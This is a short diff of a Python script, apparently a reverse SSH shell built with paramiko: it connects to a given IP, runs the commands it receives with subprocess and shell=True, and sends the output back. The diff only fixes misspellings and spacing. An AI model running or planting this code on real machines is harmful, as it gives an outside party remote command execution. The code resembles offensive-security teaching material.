@@ -2,6 +2,7 @@ import paramiko
 import shlex
 import subprocess
 
+
 def ssh_command(ip, port, user, passwd, command):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -16,14 +17,15 @@ def ssh_command(ip, port, user, passwd, command):
         try:
             cmd = command.decode()
             if cmd == 'exit':
-                clien.close()
+                client.close()
                 break
             cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
             ssh_session.send(cmd_output or 'okay')
-        except Exeption as e:
+        except Exception as e:
             ssh_session.send(str(e))
         client.close()
     return
+
 
 if __name__ == '__main__':
     import getpass
